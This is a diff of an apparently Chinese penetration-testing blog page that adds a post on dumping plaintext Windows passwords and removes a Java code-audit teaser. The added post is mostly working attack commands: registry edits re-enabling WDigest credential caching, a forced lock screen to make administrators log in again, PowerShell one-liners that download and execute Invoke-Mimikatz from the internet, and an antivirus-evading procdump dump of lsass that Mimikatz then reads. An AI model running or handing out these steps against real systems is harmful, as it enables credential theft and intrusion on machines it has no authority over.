@@ -292,6 +292,129 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-pentest-getpassword" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="../../2019/03/29/pentest-getpassword/" class="article-date">
+      <time datetime="2019-03-29T11:32:22.000Z" itemprop="datePublished">2019-03-29</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="../../2019/03/29/pentest-getpassword/">Windows下抓取明文密码</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="关于-KB2871997"><a href="#关于-KB2871997" class="headerlink" title="关于 KB2871997"></a>关于 KB2871997</h1><p>在 <code>KB2871997</code> 之前， Mimikatz 可以直接抓取明文密码。</p>
+<p>当服务器安装 <code>KB2871997</code> 补丁后，系统默认禁用 <code>Wdigest Auth</code> ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。<br>但由于一些系统服务需要用到 <code>Wdigest Auth</code>，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）</p>
+<p>以下是支持的系统:</p>
+<ul>
+<li>Windows 7</li>
+<li>Windows 8</li>
+<li>Windows 8.1</li>
+<li>Windows Server 2008</li>
+<li>Windows Server 2012</li>
+<li>Windows Server 2012R 2</li>
+</ul>
+<h2 id="开启"><a href="#开启" class="headerlink" title="开启"></a>开启</h2><ul>
+<li><p>cmd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>powershell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>meterpreter</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h2><ul>
+<li><p>cmd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>powershell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>meterpreter</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="强制锁屏"><a href="#强制锁屏" class="headerlink" title="强制锁屏"></a>强制锁屏</h1><p>在开启 <code>Wdigest Auth</code> 后，需要管理员重新登录才能逮到明文密码。</p>
+<p>我们可以强制锁屏，让管理员重新登录。</p>
+<ul>
+<li><p>cmd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>powershell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/kiraly15/Lock-WorkStation/master/Lock-WorkStation.ps1&apos;);&quot;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<blockquote>
+<p>经测试 Win10企业版 仅锁屏读明文失败，需要注销才行，其它版本未知。</p>
+</blockquote>
+<h1 id="抓取明文"><a href="#抓取明文" class="headerlink" title="抓取明文"></a>抓取明文</h1><p>开启 <code>Wdigest Auth</code> 后，接下来就用常规的抓取明文的方式就行了。</p>
+<h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><ol>
+<li><p>powershell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;);Invoke-Mimikatz</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>exe</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="离线抓取"><a href="#离线抓取" class="headerlink" title="离线抓取"></a>离线抓取</h2><p>当 <code>Mimikatz</code> 被杀，可以先将 <code>lsass</code> 进程 <code>dump</code> 下来，在本地用 <code>Mimikatz</code> 读取。</p>
+<ol>
+<li><p>Dump 进程</p>
+<p>可以用微软提供的 <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener"><code>procdump</code></a> ，自带微软签名，可以过杀软。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Mimikatz 读取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/Pentest/">Pentest</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-tools-load-shellcode" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -549,70 +672,6 @@
       
         <p class="article-more-link">
           <a href="../../2018/10/29/java-audit-step-by-step-2/#more">阅读全文 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-java-audit-step-by-step-1" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="../../2018/10/25/java-audit-step-by-step-1/" class="article-date">
-      <time datetime="2018-10-24T17:59:39.000Z" itemprop="datePublished">2018-10-25</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="../../2018/10/25/java-audit-step-by-step-1/">从1开始的Java代码审计·第一弹·基础篇（上）</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <h1 id="基本环境"><a href="#基本环境" class="headerlink" title="基本环境"></a>基本环境</h1><h2 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h2><p>目前，<code>JDK</code>已经出到<code>11</code>了，<code>JDK</code>每个版本都会有些新特性出来。很多情况下<code>JDK</code>并不向下兼容，导致一些软件在较新的<code>JDK</code>中无法正常运行，所以推荐用现在比较主流的<code>JDK8</code>。而且有些漏洞需要在低版本的<code>JDK</code>上才能复现出来，比如反序列化用到的<code>JNDI Bean Property</code>类型的<code>Gadget</code>，需要在小于<code>JDK8_113</code>的版本下才可以利用，所以在安装的时候建议再安装一个低版本的JDK。JDK安装时自带的控制面板程序，可以帮助我们很方便的切换版本。</p>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/代码审计/">代码审计</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a href="../../2018/10/25/java-audit-step-by-step-1/#more">阅读全文 >></a>
         </p>
       
       <div class="clearfix"></div>
